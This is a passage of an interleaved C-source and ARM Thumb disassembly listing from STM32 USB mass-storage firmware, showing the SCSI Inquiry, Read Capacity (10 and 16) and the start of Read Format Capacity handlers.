 8009b56:	4618      	mov	r0, r3
 8009b58:	3718      	adds	r7, #24
 8009b5a:	46bd      	mov	sp, r7
 8009b5c:	bd80      	pop	{r7, pc}
	...

08009b60 <SCSI_Inquiry>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Inquiry(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009b60:	b580      	push	{r7, lr}
 8009b62:	b088      	sub	sp, #32
 8009b64:	af00      	add	r7, sp, #0
 8009b66:	60f8      	str	r0, [r7, #12]
 8009b68:	460b      	mov	r3, r1
 8009b6a:	607a      	str	r2, [r7, #4]
 8009b6c:	72fb      	strb	r3, [r7, #11]
  uint8_t *pPage;
  uint16_t len;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009b6e:	68fb      	ldr	r3, [r7, #12]
 8009b70:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009b74:	68fb      	ldr	r3, [r7, #12]
 8009b76:	32b0      	adds	r2, #176	; 0xb0
 8009b78:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009b7c:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009b7e:	69bb      	ldr	r3, [r7, #24]
 8009b80:	2b00      	cmp	r3, #0
 8009b82:	d102      	bne.n	8009b8a <SCSI_Inquiry+0x2a>
  {
    return -1;
 8009b84:	f04f 33ff 	mov.w	r3, #4294967295
 8009b88:	e062      	b.n	8009c50 <SCSI_Inquiry+0xf0>
  }

  if (hmsc->cbw.dDataLength == 0U)
 8009b8a:	69bb      	ldr	r3, [r7, #24]
 8009b8c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009b90:	699b      	ldr	r3, [r3, #24]
 8009b92:	2b00      	cmp	r3, #0
 8009b94:	d10b      	bne.n	8009bae <SCSI_Inquiry+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009b96:	69bb      	ldr	r3, [r7, #24]
 8009b98:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009b9c:	7f59      	ldrb	r1, [r3, #29]
 8009b9e:	2320      	movs	r3, #32
 8009ba0:	2205      	movs	r2, #5
 8009ba2:	68f8      	ldr	r0, [r7, #12]
 8009ba4:	f000 fb28 	bl	800a1f8 <SCSI_SenseCode>
    return -1;
 8009ba8:	f04f 33ff 	mov.w	r3, #4294967295
 8009bac:	e050      	b.n	8009c50 <SCSI_Inquiry+0xf0>
  }

  if ((params[1] & 0x01U) != 0U) /* Evpd is set */
 8009bae:	687b      	ldr	r3, [r7, #4]
 8009bb0:	3301      	adds	r3, #1
 8009bb2:	781b      	ldrb	r3, [r3, #0]
 8009bb4:	f003 0301 	and.w	r3, r3, #1
 8009bb8:	2b00      	cmp	r3, #0
 8009bba:	d021      	beq.n	8009c00 <SCSI_Inquiry+0xa0>
  {
    if (params[2] == 0U) /* Request for Supported Vital Product Data Pages*/
 8009bbc:	687b      	ldr	r3, [r7, #4]
 8009bbe:	3302      	adds	r3, #2
 8009bc0:	781b      	ldrb	r3, [r3, #0]
 8009bc2:	2b00      	cmp	r3, #0
 8009bc4:	d105      	bne.n	8009bd2 <SCSI_Inquiry+0x72>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page00_Inquiry_Data, LENGTH_INQUIRY_PAGE00);
 8009bc6:	2206      	movs	r2, #6
 8009bc8:	4923      	ldr	r1, [pc, #140]	; (8009c58 <SCSI_Inquiry+0xf8>)
 8009bca:	69b8      	ldr	r0, [r7, #24]
 8009bcc:	f001 f8fa 	bl	800adc4 <SCSI_UpdateBotData>
 8009bd0:	e03d      	b.n	8009c4e <SCSI_Inquiry+0xee>
    }
    else if (params[2] == 0x80U) /* Request for VPD page 0x80 Unit Serial Number */
 8009bd2:	687b      	ldr	r3, [r7, #4]
 8009bd4:	3302      	adds	r3, #2
 8009bd6:	781b      	ldrb	r3, [r3, #0]
 8009bd8:	2b80      	cmp	r3, #128	; 0x80
 8009bda:	d105      	bne.n	8009be8 <SCSI_Inquiry+0x88>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page80_Inquiry_Data, LENGTH_INQUIRY_PAGE80);
 8009bdc:	2208      	movs	r2, #8
 8009bde:	491f      	ldr	r1, [pc, #124]	; (8009c5c <SCSI_Inquiry+0xfc>)
 8009be0:	69b8      	ldr	r0, [r7, #24]
 8009be2:	f001 f8ef 	bl	800adc4 <SCSI_UpdateBotData>
 8009be6:	e032      	b.n	8009c4e <SCSI_Inquiry+0xee>
    }
    else /* Request Not supported */
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST,
 8009be8:	69bb      	ldr	r3, [r7, #24]
 8009bea:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009bee:	7f59      	ldrb	r1, [r3, #29]
 8009bf0:	2324      	movs	r3, #36	; 0x24
 8009bf2:	2205      	movs	r2, #5
 8009bf4:	68f8      	ldr	r0, [r7, #12]
 8009bf6:	f000 faff 	bl	800a1f8 <SCSI_SenseCode>
                     INVALID_FIELED_IN_COMMAND);

      return -1;
 8009bfa:	f04f 33ff 	mov.w	r3, #4294967295
 8009bfe:	e027      	b.n	8009c50 <SCSI_Inquiry+0xf0>
    }
  }
  else
  {

    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009c00:	68fb      	ldr	r3, [r7, #12]
 8009c02:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009c06:	68fa      	ldr	r2, [r7, #12]
 8009c08:	33b0      	adds	r3, #176	; 0xb0
 8009c0a:	009b      	lsls	r3, r3, #2
 8009c0c:	4413      	add	r3, r2
 8009c0e:	685b      	ldr	r3, [r3, #4]
            ->pInquiry[lun * STANDARD_INQUIRY_DATA_LEN];
 8009c10:	69d9      	ldr	r1, [r3, #28]
 8009c12:	7afa      	ldrb	r2, [r7, #11]
 8009c14:	4613      	mov	r3, r2
 8009c16:	00db      	lsls	r3, r3, #3
 8009c18:	4413      	add	r3, r2
 8009c1a:	009b      	lsls	r3, r3, #2
    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009c1c:	440b      	add	r3, r1
 8009c1e:	617b      	str	r3, [r7, #20]
    len = (uint16_t)pPage[4] + 5U;
 8009c20:	697b      	ldr	r3, [r7, #20]
 8009c22:	3304      	adds	r3, #4
 8009c24:	781b      	ldrb	r3, [r3, #0]
 8009c26:	b29b      	uxth	r3, r3
 8009c28:	3305      	adds	r3, #5
 8009c2a:	83fb      	strh	r3, [r7, #30]

    if (params[4] <= len)
 8009c2c:	687b      	ldr	r3, [r7, #4]
 8009c2e:	3304      	adds	r3, #4
 8009c30:	781b      	ldrb	r3, [r3, #0]
 8009c32:	b29b      	uxth	r3, r3
 8009c34:	8bfa      	ldrh	r2, [r7, #30]
 8009c36:	429a      	cmp	r2, r3
 8009c38:	d303      	bcc.n	8009c42 <SCSI_Inquiry+0xe2>
    {
      len = params[4];
 8009c3a:	687b      	ldr	r3, [r7, #4]
 8009c3c:	3304      	adds	r3, #4
 8009c3e:	781b      	ldrb	r3, [r3, #0]
 8009c40:	83fb      	strh	r3, [r7, #30]
    }

    (void)SCSI_UpdateBotData(hmsc, pPage, len);
 8009c42:	8bfb      	ldrh	r3, [r7, #30]
 8009c44:	461a      	mov	r2, r3
 8009c46:	6979      	ldr	r1, [r7, #20]
 8009c48:	69b8      	ldr	r0, [r7, #24]
 8009c4a:	f001 f8bb 	bl	800adc4 <SCSI_UpdateBotData>
  }

  return 0;
 8009c4e:	2300      	movs	r3, #0
}
 8009c50:	4618      	mov	r0, r3
 8009c52:	3720      	adds	r7, #32
 8009c54:	46bd      	mov	sp, r7
 8009c56:	bd80      	pop	{r7, pc}
 8009c58:	2000010c 	.word	0x2000010c
 8009c5c:	20000114 	.word	0x20000114

08009c60 <SCSI_ReadCapacity10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009c60:	b590      	push	{r4, r7, lr}
 8009c62:	b087      	sub	sp, #28
 8009c64:	af00      	add	r7, sp, #0
 8009c66:	60f8      	str	r0, [r7, #12]
 8009c68:	460b      	mov	r3, r1
 8009c6a:	607a      	str	r2, [r7, #4]
 8009c6c:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009c6e:	68fb      	ldr	r3, [r7, #12]
 8009c70:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009c74:	68fb      	ldr	r3, [r7, #12]
 8009c76:	32b0      	adds	r2, #176	; 0xb0
 8009c78:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009c7c:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009c7e:	697b      	ldr	r3, [r7, #20]
 8009c80:	2b00      	cmp	r3, #0
 8009c82:	d102      	bne.n	8009c8a <SCSI_ReadCapacity10+0x2a>
  {
    return -1;
 8009c84:	f04f 33ff 	mov.w	r3, #4294967295
 8009c88:	e075      	b.n	8009d76 <SCSI_ReadCapacity10+0x116>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 8009c8a:	68fb      	ldr	r3, [r7, #12]
 8009c8c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009c90:	68fa      	ldr	r2, [r7, #12]
 8009c92:	33b0      	adds	r3, #176	; 0xb0
 8009c94:	009b      	lsls	r3, r3, #2
 8009c96:	4413      	add	r3, r2
 8009c98:	685b      	ldr	r3, [r3, #4]
 8009c9a:	685c      	ldr	r4, [r3, #4]
 8009c9c:	697b      	ldr	r3, [r7, #20]
 8009c9e:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 8009ca2:	3308      	adds	r3, #8
 8009ca4:	697a      	ldr	r2, [r7, #20]
 8009ca6:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 8009caa:	3204      	adds	r2, #4
 8009cac:	7af8      	ldrb	r0, [r7, #11]
 8009cae:	4619      	mov	r1, r3
 8009cb0:	47a0      	blx	r4
 8009cb2:	4603      	mov	r3, r0
 8009cb4:	74fb      	strb	r3, [r7, #19]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009cb6:	f997 3013 	ldrsb.w	r3, [r7, #19]
 8009cba:	2b00      	cmp	r3, #0
 8009cbc:	d106      	bne.n	8009ccc <SCSI_ReadCapacity10+0x6c>
 8009cbe:	697b      	ldr	r3, [r7, #20]
 8009cc0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009cc4:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009cc8:	2b02      	cmp	r3, #2
 8009cca:	d108      	bne.n	8009cde <SCSI_ReadCapacity10+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009ccc:	7af9      	ldrb	r1, [r7, #11]
 8009cce:	233a      	movs	r3, #58	; 0x3a
 8009cd0:	2202      	movs	r2, #2
 8009cd2:	68f8      	ldr	r0, [r7, #12]
 8009cd4:	f000 fa90 	bl	800a1f8 <SCSI_SenseCode>
    return -1;
 8009cd8:	f04f 33ff 	mov.w	r3, #4294967295
 8009cdc:	e04b      	b.n	8009d76 <SCSI_ReadCapacity10+0x116>
  }

  hmsc->bot_data[0] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 8009cde:	697b      	ldr	r3, [r7, #20]
 8009ce0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ce4:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009ce6:	3b01      	subs	r3, #1
 8009ce8:	0e1b      	lsrs	r3, r3, #24
 8009cea:	b2da      	uxtb	r2, r3
 8009cec:	697b      	ldr	r3, [r7, #20]
 8009cee:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[1] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 8009cf0:	697b      	ldr	r3, [r7, #20]
 8009cf2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009cf6:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009cf8:	3b01      	subs	r3, #1
 8009cfa:	0c1b      	lsrs	r3, r3, #16
 8009cfc:	b2da      	uxtb	r2, r3
 8009cfe:	697b      	ldr	r3, [r7, #20]
 8009d00:	745a      	strb	r2, [r3, #17]
  hmsc->bot_data[2] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 8009d02:	697b      	ldr	r3, [r7, #20]
 8009d04:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d08:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009d0a:	3b01      	subs	r3, #1
 8009d0c:	0a1b      	lsrs	r3, r3, #8
 8009d0e:	b2da      	uxtb	r2, r3
 8009d10:	697b      	ldr	r3, [r7, #20]
 8009d12:	749a      	strb	r2, [r3, #18]
  hmsc->bot_data[3] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 8009d14:	697b      	ldr	r3, [r7, #20]
 8009d16:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d1a:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009d1c:	b2db      	uxtb	r3, r3
 8009d1e:	3b01      	subs	r3, #1
 8009d20:	b2da      	uxtb	r2, r3
 8009d22:	697b      	ldr	r3, [r7, #20]
 8009d24:	74da      	strb	r2, [r3, #19]

  hmsc->bot_data[4] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 8009d26:	697b      	ldr	r3, [r7, #20]
 8009d28:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d2c:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009d30:	161b      	asrs	r3, r3, #24
 8009d32:	b2da      	uxtb	r2, r3
 8009d34:	697b      	ldr	r3, [r7, #20]
 8009d36:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 8009d38:	697b      	ldr	r3, [r7, #20]
 8009d3a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d3e:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009d42:	141b      	asrs	r3, r3, #16
 8009d44:	b2da      	uxtb	r2, r3
 8009d46:	697b      	ldr	r3, [r7, #20]
 8009d48:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 8009d4a:	697b      	ldr	r3, [r7, #20]
 8009d4c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d50:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009d54:	0a1b      	lsrs	r3, r3, #8
 8009d56:	b29b      	uxth	r3, r3
 8009d58:	b2da      	uxtb	r2, r3
 8009d5a:	697b      	ldr	r3, [r7, #20]
 8009d5c:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_size);
 8009d5e:	697b      	ldr	r3, [r7, #20]
 8009d60:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d64:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009d68:	b2da      	uxtb	r2, r3
 8009d6a:	697b      	ldr	r3, [r7, #20]
 8009d6c:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data_length = 8U;
 8009d6e:	697b      	ldr	r3, [r7, #20]
 8009d70:	2208      	movs	r2, #8
 8009d72:	60da      	str	r2, [r3, #12]

  return 0;
 8009d74:	2300      	movs	r3, #0

}
 8009d76:	4618      	mov	r0, r3
 8009d78:	371c      	adds	r7, #28
 8009d7a:	46bd      	mov	sp, r7
 8009d7c:	bd90      	pop	{r4, r7, pc}

08009d7e <SCSI_ReadCapacity16>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity16(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009d7e:	b590      	push	{r4, r7, lr}
 8009d80:	b089      	sub	sp, #36	; 0x24
 8009d82:	af00      	add	r7, sp, #0
 8009d84:	60f8      	str	r0, [r7, #12]
 8009d86:	460b      	mov	r3, r1
 8009d88:	607a      	str	r2, [r7, #4]
 8009d8a:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint32_t idx;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009d8c:	68fb      	ldr	r3, [r7, #12]
 8009d8e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009d92:	68fb      	ldr	r3, [r7, #12]
 8009d94:	32b0      	adds	r2, #176	; 0xb0
 8009d96:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009d9a:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009d9c:	69bb      	ldr	r3, [r7, #24]
 8009d9e:	2b00      	cmp	r3, #0
 8009da0:	d102      	bne.n	8009da8 <SCSI_ReadCapacity16+0x2a>
  {
    return -1;
 8009da2:	f04f 33ff 	mov.w	r3, #4294967295
 8009da6:	e0ab      	b.n	8009f00 <SCSI_ReadCapacity16+0x182>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 8009da8:	68fb      	ldr	r3, [r7, #12]
 8009daa:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009dae:	68fa      	ldr	r2, [r7, #12]
 8009db0:	33b0      	adds	r3, #176	; 0xb0
 8009db2:	009b      	lsls	r3, r3, #2
 8009db4:	4413      	add	r3, r2
 8009db6:	685b      	ldr	r3, [r3, #4]
 8009db8:	685c      	ldr	r4, [r3, #4]
 8009dba:	69bb      	ldr	r3, [r7, #24]
 8009dbc:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 8009dc0:	3308      	adds	r3, #8
 8009dc2:	69ba      	ldr	r2, [r7, #24]
 8009dc4:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 8009dc8:	3204      	adds	r2, #4
 8009dca:	7af8      	ldrb	r0, [r7, #11]
 8009dcc:	4619      	mov	r1, r3
 8009dce:	47a0      	blx	r4
 8009dd0:	4603      	mov	r3, r0
 8009dd2:	75fb      	strb	r3, [r7, #23]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009dd4:	f997 3017 	ldrsb.w	r3, [r7, #23]
 8009dd8:	2b00      	cmp	r3, #0
 8009dda:	d106      	bne.n	8009dea <SCSI_ReadCapacity16+0x6c>
 8009ddc:	69bb      	ldr	r3, [r7, #24]
 8009dde:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009de2:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009de6:	2b02      	cmp	r3, #2
 8009de8:	d108      	bne.n	8009dfc <SCSI_ReadCapacity16+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009dea:	7af9      	ldrb	r1, [r7, #11]
 8009dec:	233a      	movs	r3, #58	; 0x3a
 8009dee:	2202      	movs	r2, #2
 8009df0:	68f8      	ldr	r0, [r7, #12]
 8009df2:	f000 fa01 	bl	800a1f8 <SCSI_SenseCode>
    return -1;
 8009df6:	f04f 33ff 	mov.w	r3, #4294967295
 8009dfa:	e081      	b.n	8009f00 <SCSI_ReadCapacity16+0x182>
  }

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009dfc:	687b      	ldr	r3, [r7, #4]
 8009dfe:	330a      	adds	r3, #10
 8009e00:	781b      	ldrb	r3, [r3, #0]
 8009e02:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 8009e04:	687b      	ldr	r3, [r7, #4]
 8009e06:	330b      	adds	r3, #11
 8009e08:	781b      	ldrb	r3, [r3, #0]
 8009e0a:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009e0c:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 8009e0e:	687b      	ldr	r3, [r7, #4]
 8009e10:	330c      	adds	r3, #12
 8009e12:	781b      	ldrb	r3, [r3, #0]
 8009e14:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 8009e16:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 8009e18:	687a      	ldr	r2, [r7, #4]
 8009e1a:	320d      	adds	r2, #13
 8009e1c:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 8009e1e:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009e20:	69bb      	ldr	r3, [r7, #24]
 8009e22:	60da      	str	r2, [r3, #12]

  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 8009e24:	2300      	movs	r3, #0
 8009e26:	61fb      	str	r3, [r7, #28]
 8009e28:	e008      	b.n	8009e3c <SCSI_ReadCapacity16+0xbe>
  {
    hmsc->bot_data[idx] = 0U;
 8009e2a:	69ba      	ldr	r2, [r7, #24]
 8009e2c:	69fb      	ldr	r3, [r7, #28]
 8009e2e:	4413      	add	r3, r2
 8009e30:	3310      	adds	r3, #16
 8009e32:	2200      	movs	r2, #0
 8009e34:	701a      	strb	r2, [r3, #0]
  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 8009e36:	69fb      	ldr	r3, [r7, #28]
 8009e38:	3301      	adds	r3, #1
 8009e3a:	61fb      	str	r3, [r7, #28]
 8009e3c:	69bb      	ldr	r3, [r7, #24]
 8009e3e:	68db      	ldr	r3, [r3, #12]
 8009e40:	69fa      	ldr	r2, [r7, #28]
 8009e42:	429a      	cmp	r2, r3
 8009e44:	d3f1      	bcc.n	8009e2a <SCSI_ReadCapacity16+0xac>
  }

  hmsc->bot_data[4] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 8009e46:	69bb      	ldr	r3, [r7, #24]
 8009e48:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e4c:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009e4e:	3b01      	subs	r3, #1
 8009e50:	0e1b      	lsrs	r3, r3, #24
 8009e52:	b2da      	uxtb	r2, r3
 8009e54:	69bb      	ldr	r3, [r7, #24]
 8009e56:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 8009e58:	69bb      	ldr	r3, [r7, #24]
 8009e5a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e5e:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009e60:	3b01      	subs	r3, #1
 8009e62:	0c1b      	lsrs	r3, r3, #16
 8009e64:	b2da      	uxtb	r2, r3
 8009e66:	69bb      	ldr	r3, [r7, #24]
 8009e68:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 8009e6a:	69bb      	ldr	r3, [r7, #24]
 8009e6c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e70:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009e72:	3b01      	subs	r3, #1
 8009e74:	0a1b      	lsrs	r3, r3, #8
 8009e76:	b2da      	uxtb	r2, r3
 8009e78:	69bb      	ldr	r3, [r7, #24]
 8009e7a:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 8009e7c:	69bb      	ldr	r3, [r7, #24]
 8009e7e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e82:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009e84:	b2db      	uxtb	r3, r3
 8009e86:	3b01      	subs	r3, #1
 8009e88:	b2da      	uxtb	r2, r3
 8009e8a:	69bb      	ldr	r3, [r7, #24]
 8009e8c:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 8009e8e:	69bb      	ldr	r3, [r7, #24]
 8009e90:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e94:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009e98:	161b      	asrs	r3, r3, #24
 8009e9a:	b2da      	uxtb	r2, r3
 8009e9c:	69bb      	ldr	r3, [r7, #24]
 8009e9e:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 8009ea0:	69bb      	ldr	r3, [r7, #24]
 8009ea2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ea6:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009eaa:	141b      	asrs	r3, r3, #16
 8009eac:	b2da      	uxtb	r2, r3
 8009eae:	69bb      	ldr	r3, [r7, #24]
 8009eb0:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 8009eb2:	69bb      	ldr	r3, [r7, #24]
 8009eb4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009eb8:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009ebc:	0a1b      	lsrs	r3, r3, #8
 8009ebe:	b29b      	uxth	r3, r3
 8009ec0:	b2da      	uxtb	r2, r3
 8009ec2:	69bb      	ldr	r3, [r7, #24]
 8009ec4:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(hmsc->scsi_blk_size);
 8009ec6:	69bb      	ldr	r3, [r7, #24]
 8009ec8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ecc:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009ed0:	b2da      	uxtb	r2, r3
 8009ed2:	69bb      	ldr	r3, [r7, #24]
 8009ed4:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009ed6:	687b      	ldr	r3, [r7, #4]
 8009ed8:	330a      	adds	r3, #10
 8009eda:	781b      	ldrb	r3, [r3, #0]
 8009edc:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 8009ede:	687b      	ldr	r3, [r7, #4]
 8009ee0:	330b      	adds	r3, #11
 8009ee2:	781b      	ldrb	r3, [r3, #0]
 8009ee4:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009ee6:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 8009ee8:	687b      	ldr	r3, [r7, #4]
 8009eea:	330c      	adds	r3, #12
 8009eec:	781b      	ldrb	r3, [r3, #0]
 8009eee:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 8009ef0:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 8009ef2:	687a      	ldr	r2, [r7, #4]
 8009ef4:	320d      	adds	r2, #13
 8009ef6:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 8009ef8:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009efa:	69bb      	ldr	r3, [r7, #24]
 8009efc:	60da      	str	r2, [r3, #12]

  return 0;
 8009efe:	2300      	movs	r3, #0
}
 8009f00:	4618      	mov	r0, r3
 8009f02:	3724      	adds	r7, #36	; 0x24
 8009f04:	46bd      	mov	sp, r7
 8009f06:	bd90      	pop	{r4, r7, pc}

08009f08 <SCSI_ReadFormatCapacity>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadFormatCapacity(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009f08:	b580      	push	{r7, lr}
 8009f0a:	b088      	sub	sp, #32
 8009f0c:	af00      	add	r7, sp, #0
 8009f0e:	60f8      	str	r0, [r7, #12]
 8009f10:	460b      	mov	r3, r1
 8009f12:	607a      	str	r2, [r7, #4]
 8009f14:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint16_t blk_size;
  uint32_t blk_nbr;
  uint16_t i;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009f16:	68fb      	ldr	r3, [r7, #12]
 8009f18:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009f1c:	68fb      	ldr	r3, [r7, #12]
 8009f1e:	32b0      	adds	r2, #176	; 0xb0
 8009f20:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009f24:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009f26:	69bb      	ldr	r3, [r7, #24]
 8009f28:	2b00      	cmp	r3, #0
 8009f2a:	d102      	bne.n	8009f32 <SCSI_ReadFormatCapacity+0x2a>
  {
    return -1;
 8009f2c:	f04f 33ff 	mov.w	r3, #4294967295
 8009f30:	e063      	b.n	8009ffa <SCSI_ReadFormatCapacity+0xf2>
